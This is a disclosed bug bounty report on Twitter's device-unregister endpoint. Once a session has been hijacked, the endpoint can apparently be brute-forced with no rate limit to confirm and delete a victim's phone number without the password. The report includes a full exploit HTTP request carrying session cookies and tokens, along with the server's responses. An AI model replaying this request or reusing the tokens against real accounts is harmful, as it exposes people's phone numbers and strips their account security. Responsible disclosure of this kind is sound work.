# PI leakage By Brute Forcing and Phone number deleting without using password

## Report Details
- **Report ID**: 1087525
- **URL**: https://hackerone.com/reports/1087525
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-26T13:57:49.038Z
- **Disclosed**: 2021-04-22T16:35:16.872Z

## Reporter
- **Username**: a13h1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to disclose the victim's Phone Number and cannot remove(delete the phone number), as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)

This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password)

##Description:
 For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to disclose the Phone Number (Personal Info)or able to remove the victim Phone number 

So this issue is leads to PI leakage by bypassing the password authentication because in twitter we need to enter the password to get into the account setting and deleting the phone number



## Steps To Reproduce:

1.  Use the below request to regenerate the issue

POST /i/api/1.1/device/unregister.json HTTP/1.1
Host: twitter.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://twitter.com/settings/phone
authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA
x-twitter-auth-type: OAuth2Session
x-twitter-client-language: en
x-twitter-active-user: yes
content-type: application/x-www-form-urlencoded
x-csrf-token: ff2ffbac7022086cf6f9b8bd5bab1db0867608a86f29c36a07e5098e77c933a63d6b58040a5431c783d0405c6cd0bcc6db33c23fd40b2355717fd3461986c117083941cca395e2268be2fe1ff1d0d01f
Content-Length: 28
Origin: https://twitter.com
Connection: close
Cookie: _ga=GA1.2.1934906781.1600634518; kdt=RJzTVzAyG9tYDKN1JYYBTY6qxuvSoarrK4gl5Yjn; remember_checked_on=1; _gid=GA1.2.1680084220.1611590216; mbox=session#52f0077eb7804a2395f66b219d53df8c#1611676575; at_check=true; lang=en; cd_user_id=1773f4d2a7ea-0e8308a702e6d88-31634645-1fa400-1773f4d2a7f2; gt=1354060492269096960; personalization_id="v1_viWq+tRogA+gdH7F6rki9A=="; guest_id=v1%3A161166820124545510; ct0=ff2ffbac7022086cf6f9b8bd5bab1db0867608a86f29c36a07e5098e77c933a63d6b58040a5431c783d0405c6cd0bcc6db33c23fd40b2355717fd3461986c117083941cca395e2268be2fe1ff1d0d01f; ads_prefs="HBERAAA="; _twitter_sess=BAh7CiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCC426T53AToJdXNlcmwr%250ACQEA1xjqWMkSOgxjc3JmX2lkIiUxODg2NDcwZWNkMWY4YWU5NTVjNWNiZDg3%250ANDRmMDc0NjoHaWQiJWNjMzgzNWU2NDQxNDkzYjFjZWY2YmMzODA3MGYwOGUy--96dc661c5411d47c03c4c09292e4a42610a0b24e; twid=u%3D1353710925463879681; auth_token=9b17ab39756e101001234f6b59e278775f3fdc15

phone_number=%2B919999999906


2.  We have victim session hijacked account so we replace some headers and cookie in above request 

3.  We didn't know the Phone number so we are place some random number in phone_number parameter

4. Then start brute forcing so their is no rate limit here 

5. See the POC for more clearification  F1172750

6. The request we use is generate from the hacker personal account we just change  authorization: Bearer , x-csrf-token , cookie by the victim session 

as you see in POC 

If the response is come in 404 the phone number is not true and it didn't get delete

HTTP/1.1 404 Not Found
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 64
content-type: application/json; charset=utf-8
date: Tue, 26 Jan 2021 13:41:46 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Tue, 26 Jan 2021 13:41:46 GMT
pragma: no-cache
server: tsa_o
status: 404 Not Found
strict-transport-security: max-age=631138519
x-client-event-enabled: true
x-connection-hash: a429bf26b4a46c4d3bc600f80ac11ffe
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 124
x-transaction: 00849dce003bcaed
x-tsa-request-body-time: 1
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0

{"errors":[{"code":157,"message":"Verified device not found."}]}


If the response comes in 200 that means the phone number is true and the phone number is deleted from the account

HTTP/1.1 200 OK
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
content-length: 0
content-type: application/json;charset=utf-8
date: Tue, 26 Jan 2021 13:47:42 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Tue, 26 Jan 2021 13:47:42 GMT
pragma: no-cache
server: tsa_o
status: 200 OK
strict-transport-security: max-age=631138519
x-access-level: read-write-directmessages
x-client-event-enabled: true
x-connection-hash: fbc3dbbec5096ecf1194cec8aecb4d71
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 155
x-transaction: 00e5c7150079403a
x-tsa-request-body-time: 0
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0


And if the response came 200 the hacker see the payload phone number which is relative to the user Personal info which is disclose 

and for all these we didn't need any password authentication

## Impact

The impact is the hacker didn't need any password to delete the  phone number and get the phone number of victim by brute forcing 
So this issue is leads to PI leakage by bypassing the password authentication

Thanks

## Attachments
- twitter.mp4
